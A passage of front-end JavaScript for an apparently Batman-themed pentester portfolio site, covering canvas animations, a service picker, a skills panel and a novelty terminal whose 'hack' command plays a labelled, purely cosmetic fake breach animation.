      const CX = W / 2, CY = H * 0.53, F = 800;

      ctx.globalCompositeOperation = 'source-over';
      ctx.fillStyle = 'rgba(5, 6, 8, 0.34)';
      ctx.fillRect(0, 0, W, H);
      const glow = ctx.createRadialGradient(CX, CY, 0, CX, CY, Math.min(W, H) * 0.5);
      glow.addColorStop(0, 'rgba(255, 210, 63, 0.014)');
      glow.addColorStop(1, 'rgba(255, 210, 63, 0)');
      ctx.fillStyle = glow;
      ctx.fillRect(0, 0, W, H);

      const spring = 0.022, damp = Math.pow(0.88, dt);
      const R = W < 760 ? 85 : 125, R2 = R * R;
      const mx = mouse.x, my = mouse.y;
      for (let k = 0; k < N; k++) {
        let x = P.x[k], y = P.y[k], z = P.z[k];
        let vx = P.vx[k], vy = P.vy[k], vz = P.vz[k];
        vx += (P.tx[k] * fs - x) * spring * dt;
        vy += (P.ty[k] * fs - y) * spring * dt;
        vz += (P.tz[k] * fs - z) * spring * dt;
        const dx = P.sx[k] - mx, dy = P.sy[k] - my, d2 = dx * dx + dy * dy;
        if (d2 < R2) {
          const d = Math.sqrt(d2) || 1;
          const f = (1 - d / R) * 3.4 * dt;
          vx += (dx / d) * f;
          vy += (dy / d) * f;
          vz += (Math.random() - 0.5) * f * 3;
        }
        vx *= damp; vy *= damp; vz *= damp;
        x += vx * dt; y += vy * dt; z += vz * dt;
        P.x[k] = x; P.y[k] = y; P.z[k] = z;
        P.vx[k] = vx; P.vy[k] = vy; P.vz[k] = vz;
        const x1 = x * cY - z * sY;
        const z1 = x * sY + z * cY;
        const y1 = y * cX - z1 * sX;
        const z2 = y * sX + z1 * cX;
        const s = F / Math.max(80, F + z2);
        P.sx[k] = CX + x1 * s;
        P.sy[k] = CY + y1 * s;
        P.s[k] = s;
        P.b[k] = vx * vx + vy * vy > 10 ? 3 : z2 < -10 ? 0 : z2 < 12 ? 1 : 2;
      }

      ctx.globalCompositeOperation = 'lighter';
      const styles = ['rgba(255,228,130,0.95)', 'rgba(255,210,63,0.8)', 'rgba(245,165,36,0.42)', 'rgba(200,232,255,0.95)'];
      const base = W < 760 ? 1.8 : 1.55;
      for (let b = 0; b < 4; b++) {
        ctx.fillStyle = styles[b];
        for (let k = 0; k < N; k++) {
          if (P.b[k] !== b) continue;
          const sz = base * P.s[k];
          ctx.fillRect(P.sx[k] - sz / 2, P.sy[k] - sz / 2, sz, sz);
        }
      }
      ctx.globalCompositeOperation = 'source-over';

      if (now > nextAuto && now - lastUser > 7000) {
        morph(cur + 1);
        nextAuto = now + 5200;
      }
    }

    function loop(now) {
      raf = requestAnimationFrame(loop);
      frame(now);
    }
    function start() {
      if (raf || !visible || document.hidden) return;
      last = performance.now();
      raf = requestAnimationFrame(loop);
    }
    function stop() { cancelAnimationFrame(raf); raf = 0; }

    // nav diamonds
    SHAPES.forEach((s, j) => {
      const b = document.createElement('button');
      b.type = 'button';
      b.setAttribute('role', 'tab');
      b.setAttribute('aria-label', s.word);
      b.innerHTML = `<span>${String(j + 1).padStart(2, '0')}</span>`;
      b.addEventListener('click', (e) => {
        e.stopPropagation();
        lastUser = performance.now();
        morph(j, null, null, true);
      });
      navEl.appendChild(b);
    });

    sec.addEventListener('pointermove', (e) => {
      const r = sec.getBoundingClientRect();
      mouse.x = e.clientX - r.left;
      mouse.y = e.clientY - r.top;
      lastUser = performance.now();
    });
    const away = () => { mouse.x = -1e4; mouse.y = -1e4; };
    sec.addEventListener('pointerleave', away);
    sec.addEventListener('pointercancel', away);
    sec.addEventListener('pointerup', (e) => { if (e.pointerType !== 'mouse') setTimeout(away, 250); });
    sec.addEventListener('click', (e) => {
      if (e.target.closest('button, a')) return;
      lastUser = performance.now();
      const r = sec.getBoundingClientRect();
      morph(cur + 1, e.clientX - r.left, e.clientY - r.top);
    });

    new IntersectionObserver((es) => {
      const was = visible;
      visible = es[0].isIntersecting;
      if (visible && !was) {
        if (!P) resize();
        // re-assemble with a bang when you come back after a while
        if (P && hiddenAt && performance.now() - hiddenAt > 4000) scatter(true);
        nextAuto = performance.now() + 5200;
        start();
      } else if (!visible && was) {
        hiddenAt = performance.now();
        stop();
      }
    }, { threshold: 0.05 }).observe(sec);
    document.addEventListener('visibilitychange', () => (document.hidden ? stop() : start()));

    let rT;
    let lastW = innerWidth;
    addEventListener('resize', () => {
      clearTimeout(rT);
      rT = setTimeout(() => {
        if (innerWidth === lastW && Math.abs(sec.getBoundingClientRect().height - H) < 120) return;
        lastW = innerWidth;
        resize();
      }, 200);
    });
    // text-based forms must be re-sampled once the web fonts arrive
    document.fonts?.ready.then(() => { cache[4] = null; cache[5] = null; });

    resize();
    labels();
  }

  /* =========================================================
     MINI VISUALS (project cards)
     ========================================================= */
  function minis() {
    const list = [];
    const MINI = {
      graph: { setup: graphSetup, draw: graphDraw },
      cipher: { setup: cipherSetup, draw: cipherDraw },
      pixels: { setup: pixelSetup, draw: pixelDraw },
      rooms: { setup: roomsSetup, draw: roomsDraw },
      textenc: { setup: textSetup, draw: textDraw },
      imgenc: { setup: imgSetup, draw: imgDraw },
    };

    function size(m) {
      const r = m.canvas.getBoundingClientRect();
      const dpr = Math.min(window.devicePixelRatio || 1, DPR_CAP);
      m.w = Math.max(1, r.width);
      m.h = Math.max(1, r.height);
      m.canvas.width = Math.round(m.w * dpr);
      m.canvas.height = Math.round(m.h * dpr);
      m.ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      m.s = {};
      m.def.setup(m);
    }

    const io = new IntersectionObserver((es) => {
      es.forEach((e) => {
        const m = list.find((x) => x.canvas === e.target);
        if (m) m.visible = e.isIntersecting;
      });
    }, { rootMargin: '80px' });

    $$('canvas.mini').forEach((c) => {
      const def = MINI[c.dataset.mini];
      if (!def) return;
      const m = { canvas: c, ctx: c.getContext('2d'), def, visible: false, w: 0, h: 0, s: {} };
      size(m);
      list.push(m);
      io.observe(c);
    });

    let rT;
    addEventListener('resize', () => {
      clearTimeout(rT);
      rT = setTimeout(() => list.forEach(size), 200);
    });

    let last = performance.now();
    (function loop(now) {
      const dt = clamp((now - last) / 16.67, 0.2, 3);
      last = now;
      if (!document.hidden) list.forEach((m) => { if (m.visible) m.def.draw(m, now, dt); });
      requestAnimationFrame(loop);
    })(last);

    /* --- SCINT fraud-ring graph --- */
    function graphSetup(m) {
      const { w, h } = m;
      const rings = [{ x: w * 0.3, y: h * 0.42 }, { x: w * 0.7, y: h * 0.62 }, { x: w * 0.62, y: h * 0.28 }];
      const nodes = [];
      const n = Math.round(clamp((w * h) / 5200, 22, 60));
      for (let i = 0; i < n; i++) {
        const ring = i < 18 ? i % 3 : -1;
        const c = ring >= 0 ? rings[ring] : null;
        nodes.push({
          x: c ? c.x + rand(-50, 50) : rand(20, w - 20),
          y: c ? c.y + rand(-40, 40) : rand(40, h - 20),
          vx: rand(-0.25, 0.25), vy: rand(-0.25, 0.25),
          ring, r: ring >= 0 ? rand(2.8, 4.2) : rand(1.6, 2.6),
          score: ring >= 0 ? Math.round(rand(71, 98)) : 0,
        });
      }
      m.s = { nodes, rings, pulses: [], scan: 0 };
      // clicking the graph fires a pulse storm through the fraud rings
      if (!m.canvas._wired) {
        m.canvas._wired = true;
        m.canvas.parentElement.addEventListener('click', () => { m.s.storm = 40; });
      }
    }
    function graphDraw(m, now, dt) {
      const { ctx, w, h } = m;
      const { nodes, rings, pulses } = m.s;
      ctx.fillStyle = '#050609';
      ctx.fillRect(0, 0, w, h);
      ctx.strokeStyle = 'rgba(255,255,255,0.035)';
      ctx.lineWidth = 1;
      ctx.beginPath();
      for (let x = 0; x < w; x += 32) { ctx.moveTo(x + 0.5, 0); ctx.lineTo(x + 0.5, h); }
      for (let y = 0; y < h; y += 32) { ctx.moveTo(0, y + 0.5); ctx.lineTo(w, y + 0.5); }
      ctx.stroke();
      const t = now * 0.001;
      for (const nd of nodes) {
        if (nd.ring >= 0) {
          const c = rings[nd.ring];
          nd.vx += (c.x + Math.sin(t * 0.4 + nd.ring) * 12 - nd.x) * 0.0009 * dt;
          nd.vy += (c.y + Math.cos(t * 0.35 + nd.ring) * 10 - nd.y) * 0.0009 * dt;
        }
        nd.vx = nd.vx * 0.99 + rand(-0.02, 0.02);
        nd.vy = nd.vy * 0.99 + rand(-0.02, 0.02);
        nd.x += nd.vx * dt;
        nd.y += nd.vy * dt;
        if (nd.x < 10 || nd.x > w - 10) nd.vx *= -1;
        if (nd.y < 36 || nd.y > h - 10) nd.vy *= -1;
        nd.x = clamp(nd.x, 10, w - 10);
        nd.y = clamp(nd.y, 36, h - 10);
      }
      const edges = [];
      for (let i = 0; i < nodes.length; i++) {
        for (let j = i + 1; j < nodes.length; j++) {
          const a = nodes[i], b = nodes[j];
          const d = Math.hypot(a.x - b.x, a.y - b.y);
          if (a.ring >= 0 && a.ring === b.ring && d < 140) edges.push([a, b, 1, d]);
          else if (d < 85) edges.push([a, b, 0, d]);
        }
      }
      for (const [a, b, red, d] of edges) {
        ctx.strokeStyle = red ? `rgba(255,61,61,${0.55 - d / 320})` : `rgba(154,163,178,${0.22 - d / 450})`;
        ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke();
      }
      const storm = m.s.storm > 0;
      if (storm) m.s.storm -= dt;
      if (Math.random() < (storm ? 0.9 : 0.08) * dt) {
        const reds = edges.filter((e) => e[2]);
        if (reds.length) { const e = reds[(Math.random() * reds.length) | 0]; pulses.push({ a: e[0], b: e[1], k: 0 }); }
      }
      for (let i = pulses.length - 1; i >= 0; i--) {
        const p = pulses[i];
        p.k += 0.025 * dt;
        if (p.k >= 1) { pulses.splice(i, 1); continue; }
        ctx.fillStyle = 'rgba(255,210,63,0.95)';
        ctx.beginPath();
        ctx.arc(p.a.x + (p.b.x - p.a.x) * p.k, p.a.y + (p.b.y - p.a.y) * p.k, 1.8, 0, Math.PI * 2);
        ctx.fill();
      }
      m.s.scan = (m.s.scan + 1.1 * dt) % (w + 80);
      const sx = m.s.scan - 40;
      const sg = ctx.createLinearGradient(sx - 40, 0, sx, 0);
      sg.addColorStop(0, 'rgba(255,210,63,0)');
      sg.addColorStop(1, 'rgba(255,210,63,0.12)');
      ctx.fillStyle = sg;
      ctx.fillRect(sx - 40, 0, 40, h);
      ctx.fillStyle = 'rgba(255,210,63,0.5)';
      ctx.fillRect(sx, 0, 1, h);
      ctx.font = '600 9px "JetBrains Mono", monospace';
      for (const nd of nodes) {
        const hot = Math.abs(nd.x - sx) < 26;
        if (nd.ring >= 0) {
          ctx.fillStyle = 'rgba(255,61,61,0.18)';
          ctx.beginPath(); ctx.arc(nd.x, nd.y, nd.r * 3, 0, Math.PI * 2); ctx.fill();
          ctx.fillStyle = '#ff3d3d';
        } else {
          ctx.fillStyle = hot ? '#ffd23f' : '#9aa3b2';
        }
        ctx.beginPath(); ctx.arc(nd.x, nd.y, nd.r, 0, Math.PI * 2); ctx.fill();
        if (nd.ring >= 0 && hot) {
          ctx.fillStyle = 'rgba(255,210,63,0.95)';
          ctx.fillText(String(nd.score), nd.x + 7, nd.y - 6);
        }
      }
    }

    /* --- KAUSEC cipher rain --- */
    function cipherSetup(m) {
      const colW = 14;
      m.s = { colW, drops: Array.from({ length: Math.ceil(m.w / colW) }, () => ({ y: rand(-m.h, 0), v: rand(0.8, 2.2) })) };
      m.ctx.fillStyle = '#050609';
      m.ctx.fillRect(0, 0, m.w, m.h);
    }
    function cipherDraw(m, now, dt) {
      const { ctx, w, h } = m;
      const { colW, drops } = m.s;
      ctx.fillStyle = 'rgba(5,6,9,0.14)';
      ctx.fillRect(0, 0, w, h);
      ctx.font = '12px "JetBrains Mono", monospace';
      const chars = '0123456789ABCDEF+/=';
      drops.forEach((d, i) => {
        d.y += d.v * dt * 2.2;
        ctx.fillStyle = Math.random() < 0.08 ? '#fff4c2' : `rgba(255,210,63,${0.35 + Math.random() * 0.4})`;
        ctx.fillText(chars[(Math.random() * chars.length) | 0], i * colW + 2, d.y);
        if (d.y > h + rand(0, 200)) { d.y = rand(-60, 0); d.v = rand(0.8, 2.2); }
      });
    }

    /* --- SecureOX LSB pixels --- */
    function pixelSetup(m) {
      const cell = 12;
      const cols = Math.ceil(m.w / cell);
      const rows = Math.ceil(m.h / cell);
      const cells = [];
      for (let y = 0; y < rows; y++) {
        for (let x = 0; x < cols; x++) {
          const nx = x / cols, ny = y / rows;
          const moon = Math.hypot(nx - 0.72, ny - 0.35) < 0.16 ? 1 : 0;
          const city = ny > 0.72 - Math.abs(Math.sin(nx * 23)) * 0.18 ? 1 : 0;
          const base = city ? 6 : moon ? 170 : 14 + ny * 24;
          const tint = moon ? [base, base * 0.85, base * 0.45] : [base * 0.7, base * 0.8, base * 1.2];
          cells.push({ c: tint.map((v) => Math.round(clamp(v + rand(-4, 4), 0, 255))), f: 0, bit: Math.random() < 0.5 ? 0 : 1 });
        }
      }
      m.s = { cell, cols, rows, cells, scan: 0 };
    }
    function pixelDraw(m, now, dt) {
      const { ctx, w, h } = m;
      const { cell, cols, rows, cells } = m.s;
      m.s.scan = (m.s.scan + 0.9 * dt) % (cols + 14);
      const sc = Math.floor(m.s.scan);
      for (let y = 0; y < rows; y++) {
        const i = y * cols + sc;
        if (sc < cols && cells[i] && Math.random() < 0.55) { cells[i].f = 1; cells[i].bit ^= 1; }
      }
      ctx.font = '700 8px "JetBrains Mono", monospace';
      for (let y = 0; y < rows; y++) {
        for (let x = 0; x < cols; x++) {
          const c = cells[y * cols + x];
          const f = c.f;
          ctx.fillStyle = `rgb(${(c.c[0] + (255 - c.c[0]) * f * 0.85) | 0},${(c.c[1] + (210 - c.c[1]) * f * 0.85) | 0},${(c.c[2] + (63 - c.c[2]) * f * 0.85) | 0})`;
          ctx.fillRect(x * cell, y * cell, cell - 1, cell - 1);
          if (f > 0.4) {
            ctx.fillStyle = `rgba(0,0,0,${f * 0.8})`;
            ctx.fillText(String(c.bit), x * cell + 3, y * cell + 9);
          }
          c.f = Math.max(0, f - 0.018 * dt);
        }
      }
      ctx.fillStyle = 'rgba(255,210,63,0.8)';
      ctx.fillRect(sc * cell, 0, 2, h);
      ctx.fillStyle = 'rgba(5,6,9,0.55)';
      ctx.fillRect(0, 0, w, 30);
    }

    /* --- THM rooms grid --- */
    function roomsSetup(m) {
      const gap = 3, size = 9;
      const cols = Math.floor((m.w - 20) / (size + gap));
      const rows = Math.floor((m.h - 44) / (size + gap));
      const palette = ['#ffd23f', '#ff3d3d', '#58c4ff', '#3dff8a', '#f5a524'];
      const cells = Array.from({ length: Math.max(0, cols * rows) }, (_, i) => ({ on: 0, c: palette[(i * 7 + (i % 5)) % palette.length], d: rand(0, 1) }));
      m.s = { gap, size, cols, rows, cells, k: 0 };
    }
    function roomsDraw(m, now, dt) {
      const { ctx, w, h } = m;
      const { gap, size, cols, cells } = m.s;
      ctx.fillStyle = '#050609';
      ctx.fillRect(0, 0, w, h);
      const ox = (w - cols * (size + gap)) / 2;
      m.s.k = Math.min(1.25, m.s.k + 0.004 * dt);
      const t = now * 0.001;
      cells.forEach((c, i) => {
        const target = m.s.k > i / cells.length ? 1 : 0;
        c.on += (target - c.on) * 0.12 * dt;
        ctx.globalAlpha = 0.08 + c.on * 0.75 * (0.55 + 0.45 * Math.sin(t * 2 + c.d * 20));
        ctx.fillStyle = c.on > 0.05 ? c.c : '#ffffff';
        ctx.fillRect(ox + (i % cols) * (size + gap), 36 + ((i / cols) | 0) * (size + gap), size, size);
      });
      ctx.globalAlpha = 1;
      if (m.s.k >= 1.25) {
        m.s.k = 0;
        cells.forEach((c) => { c.on = 0; });
      }
    }

    /* --- Text encryption --- */
    function textSetup(m) {
      m.s = { rows: [{ k: 'PLAIN', v: 'gotham needs you', fixed: true }, { k: 'AES-CBC', v: '' }, { k: 'DES-ECB', v: '' }, { k: 'RSA-2048', v: '' }], next: 0 };
    }
    function textDraw(m, now) {
      const { ctx, w, h } = m;
      const s = m.s;
      if (now > s.next) {
        s.rows.forEach((r) => { if (!r.fixed) r.v = Array.from({ length: 22 }, () => '0123456789abcdef'[(Math.random() * 16) | 0]).join(''); r.reveal = 0; });
        s.next = now + 2400;
      }
      ctx.fillStyle = '#050609';
      ctx.fillRect(0, 0, w, h);
      const lh = Math.min(30, (h - 40) / 4);
      ctx.font = '11px "JetBrains Mono", monospace';
      s.rows.forEach((r, i) => {
        const y = 34 + i * lh;
        ctx.fillStyle = i === 0 ? '#3dff8a' : 'rgba(255,210,63,0.75)';
        ctx.fillText(r.k, 16, y);
        r.reveal = Math.min(r.v.length, (r.reveal || 0) + 0.6);
        const shown = r.fixed ? `"${r.v}"` : r.v.slice(0, r.reveal | 0) + (r.reveal < r.v.length ? '▌' : '');
        ctx.fillStyle = i === 0 ? '#e9ebef' : '#9aa3b2';
        ctx.fillText(shown, 90, y);
      });
      ctx.fillStyle = 'rgba(255,210,63,0.4)';
      ctx.fillRect(16, 16, 28, 2);
      ctx.fillStyle = 'rgba(154,163,178,0.8)';
      ctx.font = '9px "JetBrains Mono", monospace';
      ctx.fillText('$ python encrypt.py', 52, 20);
    }

    /* --- Image encryption --- */
    function imgSetup(m) {
      const { w, h } = m;
      const dpr = m.canvas.width / w;
      const make = () => { const c = document.createElement('canvas'); c.width = m.canvas.width; c.height = m.canvas.height; const g = c.getContext('2d'); g.scale(dpr, dpr); return [c, g]; };
      const [img, g] = make();
      const grd = g.createLinearGradient(0, 0, 0, h);
      grd.addColorStop(0, '#0b0f18');
      grd.addColorStop(1, '#171b26');
      g.fillStyle = grd;
      g.fillRect(0, 0, w, h);
      const rx = Math.min(w * 0.28, 110), ry = rx * 0.6;
      g.save(); g.translate(w / 2, h * 0.56); g.scale(1, ry / rx);
      const disc = g.createRadialGradient(0, 0, 0, 0, 0, rx);
      disc.addColorStop(0, '#ffe89a'); disc.addColorStop(0.85, '#ffd23f'); disc.addColorStop(1, 'rgba(255,210,63,0)');
      g.fillStyle = disc; g.beginPath(); g.arc(0, 0, rx, 0, Math.PI * 2); g.fill(); g.restore();
      const bw = rx * 1.5;
      g.save(); g.translate(w / 2 - bw / 2, h * 0.56 - bw * 0.25 * (ry / rx) - 4); g.scale(bw / 200, (bw / 200) * (ry / rx)); g.fillStyle = '#07080b'; g.fill(BAT); g.restore();
      const [noise, n] = make();
      for (let y = 0; y < h; y += 4) {
        for (let x = 0; x < w; x += 4) {
          const v = Math.random() * 255;
          n.fillStyle = `rgb(${(v * 0.5) | 0},${(v * 0.45) | 0},${(v * 0.35) | 0})`;
          n.fillRect(x, y, 4, 4);
        }
      }
      m.s = { img, noise };
    }
    function imgDraw(m, now) {
      const { ctx, w, h } = m;
      const split = ((Math.sin(now * 0.0006) + 1) / 2) * w;
      ctx.drawImage(m.s.img, 0, 0, w, h);
      ctx.save();
      ctx.beginPath(); ctx.rect(0, 0, split, h); ctx.clip();
      ctx.drawImage(m.s.noise, (Math.random() * 4) | 0, 0, w, h);
      ctx.restore();
      ctx.fillStyle = '#ffd23f';
      ctx.fillRect(split - 1, 0, 2, h);
      ctx.fillStyle = 'rgba(255,210,63,0.15)';
      ctx.fillRect(split - 12, 0, 12, h);
      ctx.fillStyle = 'rgba(5,6,9,0.6)';
      ctx.fillRect(0, 0, w, 30);
      ctx.font = '600 9px "JetBrains Mono", monospace';
      ctx.fillStyle = 'rgba(255,210,63,0.9)';
      if (split > 70) ctx.fillText('.ENC', 10, h - 10);
      if (w - split > 70) ctx.fillText('.JPG', w - 36, h - 10);
    }
  }

  /* =========================================================
     SERVICES filter + request
     ========================================================= */
  function services() {
    const btns = $$('.filter-btn');
    const cards = $$('.svc');
    btns.forEach((b) => b.addEventListener('click', () => {
      btns.forEach((x) => { x.classList.toggle('active', x === b); x.setAttribute('aria-selected', String(x === b)); });
      const f = b.dataset.filter;
      let n = 0;
      cards.forEach((c) => {
        const show = f === 'all' || c.dataset.cat === f;
        c.classList.toggle('is-hidden', !show);
        c.classList.remove('pop');
        if (show) {
          c.classList.add('in');
          void c.offsetWidth;
          c.style.setProperty('--pd', `${n++ * 0.06}s`);
          c.classList.add('pop');
        }
      });
    }));

    // ---- mission brief: pick any number of services → dock → contact form ----
    briefOrder = cards.map((c) => c.dataset.service);
    const byName = new Map(cards.map((c) => [c.dataset.service, c]));
    const pillsWrap = $('#svcPills');
    const countEl = $('#svcCount');
    const dock = $('#briefDock');
    const pills = new Map();
    let contactInView = false;

    function render() {
      cards.forEach((c) => {
        const on = picked.has(c.dataset.service);
        c.classList.toggle('selected', on);
        const chk = $('.svc-check', c);
        chk.setAttribute('aria-pressed', String(on));
        chk.setAttribute('aria-label', `${on ? 'Remove' : 'Add'} ${c.dataset.short} ${on ? 'from' : 'to'} your mission brief`);
      });
      pills.forEach((inp, name) => {
        inp.checked = picked.has(name);
        inp.parentElement.classList.toggle('on', inp.checked);
      });
      const n = picked.size;
      if (countEl) countEl.textContent = n ? `— ${n} selected` : '— tap all that apply';
      const bc = $('#bdCount');
      if (bc.textContent !== String(n)) {
        bc.textContent = String(n);
        bc.classList.remove('bump');
        void bc.offsetWidth;
        bc.classList.add('bump');
      }
      $('#bdList').textContent = pickedList().map((s) => $('.svc-abbr', byName.get(s) || document.createElement('i'))?.textContent || s).join(' · ');
      dock.classList.toggle('show', n > 0 && !contactInView);
    }
    function setPicked(name, on, byUser, e) {
      if (on !== picked.has(name)) {
        if (on) picked.add(name);
        else picked.delete(name);
        const c = byName.get(name);
        if (byUser) {
          sound.play(on ? 'select' : 'deselect');
          if (on && c) {
            const b = $('.svc-check', c).getBoundingClientRect();
            const x = e && e.clientX ? e.clientX : b.left + b.width / 2;
            const y = e && e.clientY ? e.clientY : b.top + b.height / 2;
            fx.burst(x, y, 14);
          }
        }
        if (on && c) {
          c.classList.remove('just');
          void c.offsetWidth;
          c.classList.add('just');
        }
      }
      render();
    }
    const toggle = (name, e) => setPicked(name, !picked.has(name), true, e);
    clearBrief = () => { picked.clear(); render(); };

    // "+" / "✓" toggle on every card; clicking the card body toggles too
    cards.forEach((c) => {
      const meta = document.createElement('div');
      meta.className = 'svc-meta';
      const chk = document.createElement('button');
      chk.type = 'button';
      chk.className = 'svc-check';
      chk.dataset.sfx = 'none';
      chk.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path class="ck-plus" d="M12 5v14M5 12h14"/><path class="ck-tick" d="M5 12.5l4.5 4.5L19 7"/></svg>';
      meta.append($('.svc-code', c), chk);
      $('.svc-top', c).appendChild(meta);
      chk.addEventListener('click', (e) => { e.stopPropagation(); toggle(c.dataset.service, e); });
      c.addEventListener('click', (e) => {
        if (e.target.closest('.svc-cta, .svc-check, a')) return;
        toggle(c.dataset.service, e);
      });
    });

    // matching pills inside the contact form
    [...briefOrder, 'Something else'].forEach((name) => {
      const lab = document.createElement('label');
      lab.className = 'pill';
      lab.dataset.sfx = 'none';
      const inp = document.createElement('input');
      inp.type = 'checkbox';
      inp.value = name;
      const span = document.createElement('span');
      span.textContent = byName.get(name)?.dataset.short || name;
      lab.append(inp, span);
      pillsWrap?.appendChild(lab);
      pills.set(name, inp);
      inp.addEventListener('change', () => setPicked(name, inp.checked, true));
    });

    function engage() {
      const n = picked.size;
      toast(n ? `Mission brief locked: ${n} service${n > 1 ? 's' : ''} — tell me about the target` : 'Opening the secure channel');
      batTransition($('#contact'), () => { if (!isTouch) $('#f-name')?.focus({ preventScroll: true }); });
    }
    $$('.svc-cta').forEach((b) => b.addEventListener('click', (e) => {
      e.stopPropagation();
      setPicked(b.closest('.svc').dataset.service, true, false);
      const r = b.getBoundingClientRect();
      fx.bats(r.left + r.width / 2, r.top, 3);
      engage();
    }));
    $('#bdGo').addEventListener('click', engage);
    $('#bdClear').addEventListener('click', () => { sound.play('deselect'); clearBrief(); });

    new IntersectionObserver((es) => { contactInView = es[0].isIntersecting; render(); }, { threshold: 0.12 }).observe($('#contact'));
    render();
  }

  /* =========================================================
     SKILLS BELT
     ========================================================= */
  const SKILLS = {
    appsec: { title: 'AppSec & VAPT', desc: 'Finding and proving flaws in web applications — manually, the way real attackers work.', items: ['Web App Pentesting', 'OWASP Top 10', 'SQLi · XSS · IDOR', 'SSRF · CSRF', 'AuthN / AuthZ Testing', 'Business Logic Testing', 'Vulnerability Assessment', 'PoC Reporting', 'Remediation & Retesting'] },
    tools: { title: 'Arsenal / Tools', desc: 'The industry-standard kit for recon, exploitation and traffic analysis.', items: ['Burp Suite', 'Nmap', 'Nessus', 'Nikto', 'Ghauri', 'SQL Injection Tooling', 'Metasploit', 'Wireshark'] },
    network: { title: 'Network & Systems', desc: 'The foundations under every pentest — protocols, operating systems and escalation paths.', items: ['Network Pentesting', 'TCP/IP', 'DNS', 'HTTP/S', 'Linux Security', 'Windows Systems', 'Privilege Escalation'] },
    ai: { title: 'Code Review', desc: 'Scanning source code before attackers read it — SAST, triage and secure-coding guidance.', items: ['Source Code Scanning', 'Fortify', 'SonarQube', 'SAST Triage', 'Secure Coding', 'False-Positive Elimination', 'Remediation Guidance', 'Secure SDLC'] },
    code: { title: 'Exploitation', desc: 'Turning findings into proof — controlled exploitation with clear impact.', items: ['Metasploit', 'SQL Injection (Ghauri)', 'Post-Exploitation', 'Exploit Validation', 'PoC Development'] },
    web: { title: 'Cloud Security', desc: 'CCSP-grade thinking applied to cloud architecture, data and operations.', items: ['Cloud Security Concepts', 'Cloud Data Security', 'Identity & Access', 'Cloud Platform Security', 'Risk & Compliance', 'Secure Cloud Design'] },
  };

  function skills() {
    const pouches = $$('.pouch');
    const title = $('#spTitle');
    const desc = $('#spDesc');
    const chips = $('#spChips');
    const idx = $('#spIndex');
    if (!chips) return;
    function show(key, i, animate = true) {
      const d = SKILLS[key];
      title.textContent = d.title;
      desc.textContent = d.desc;
      idx.textContent = String(i + 1).padStart(2, '0');
      chips.innerHTML = '';
      d.items.forEach((s, k) => {
        const c = document.createElement('span');
        c.className = 'sp-chip';
        c.style.setProperty('--i', k);
        c.textContent = s;
        chips.appendChild(c);
      });
      if (animate) scramble(title, 500);
    }
    pouches.forEach((p, i) => {
      p.addEventListener('click', (e) => {
        pouches.forEach((x) => { x.classList.toggle('active', x === p); x.setAttribute('aria-selected', String(x === p)); });
        show(p.dataset.key, i);
        const r = p.getBoundingClientRect();
        if (e.isTrusted) fx.bats(r.left + r.width / 2, r.top + 10, 2);
      });
      p.addEventListener('keydown', (e) => {
        if (e.key !== 'ArrowRight' && e.key !== 'ArrowLeft') return;
        const n = pouches[(i + (e.key === 'ArrowRight' ? 1 : -1) + pouches.length) % pouches.length];
        n.focus();
        n.click();
      });
    });
    show('appsec', 0, false);
  }

  function marquees() {
    $$('.marquee-track').forEach((t) => { t.innerHTML += t.innerHTML; });
  }

  /* =========================================================
     TERMINAL
     ========================================================= */
  function terminal() {
    const out = $('#termOut');
    const form = $('#termForm');
    const input = $('#termIn');
    const body = $('#termBody');
    if (!out) return;
    const history = [];
    let hIdx = 0;
    let busy = false;

    const esc = (s) => s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
    const link = (href, text) => `<a href="${href}" target="_blank" rel="noopener">${text}</a>`;

    function print(html, cls = '') {
      const d = document.createElement('div');
      if (cls) d.className = cls;
      d.innerHTML = html;
      out.appendChild(d);
      body.scrollTop = body.scrollHeight;
      return d;
    }
    async function printLines(lines, delay = 28) {
      for (const l of lines) {
        print(l);
        await sleep(delay);
      }
    }

    async function hack() {
      const steps = [
        ['scanning gotham-mainframe.local', 'ok'],
        ['fingerprinting WAF', 'ok'],
        ['bypassing firewall', 'ok'],
        ['escalating privileges', 'ok'],
        ['exfiltrating wayne-enterprises/blueprints', 'fail'],
      ];
      for (const [label, res] of steps) {
        const line = print('');
        for (let p = 0; p <= 10; p++) {
          line.innerHTML = `<span class="t-dim">[*]</span> ${label} <span class="t-gold">[${'█'.repeat(p)}${'░'.repeat(10 - p)}]</span> ${p * 10}%`;
          body.scrollTop = body.scrollHeight;
          sound.play('tick', 900 + p * 60);
          await sleep(40 + Math.random() * 70);
        }
        line.innerHTML += res === 'ok' ? ' <span class="t-green">done</span>' : ' <span class="t-red t-b">BLOCKED</span>';
      }
      const r = body.getBoundingClientRect();
      fx.burst(r.left + r.width / 2, r.top + r.height / 2, 30, '255,61,61');
      await printLines([
        '',
        '<span class="t-red t-b">ACCESS DENIED</span> — Wayne Enterprises is fully patched. Guess who ran the pentest?',
        '<span class="t-dim">(simulated, obviously — real engagements only happen with written authorization.)</span>',
      ]);
    }

    const CMDS = {
      help: () => [
        '<span class="t-gold t-b">AVAILABLE COMMANDS</span>',
        '  <span class="t-white">whoami</span>       <span class="t-dim">— who is behind the cowl</span>',
        '  <span class="t-white">about</span>        <span class="t-dim">— professional summary</span>',
        '  <span class="t-white">experience</span>   <span class="t-dim">— mission log</span>',
        '  <span class="t-white">projects</span>     <span class="t-dim">— the arsenal, with links</span>',
        '  <span class="t-white">services</span>     <span class="t-dim">— what I can do for you</span>',
        '  <span class="t-white">skills</span>       <span class="t-dim">— the utility belt</span>',
        '  <span class="t-white">certs</span>        <span class="t-dim">— clearance levels</span>',
        '  <span class="t-white">education</span>    <span class="t-dim">— training grounds</span>',
        '  <span class="t-white">contact</span>      <span class="t-dim">— phone, email, address</span>',
        '  <span class="t-white">socials</span>      <span class="t-dim">— LinkedIn, GitHub, TryHackMe</span>',
        '  <span class="t-white">resume</span>       <span class="t-dim">— download the dossier</span>',
        '  <span class="t-white">hire</span>         <span class="t-dim">— jump to the contact form</span>',
        '  <span class="t-white">hack</span>         <span class="t-dim">— try to breach the Batcave</span>',
        '  <span class="t-white">batsignal</span>    <span class="t-dim">— you know what this does</span>',
        '  <span class="t-white">clear</span>        <span class="t-dim">— wipe the screen</span>',
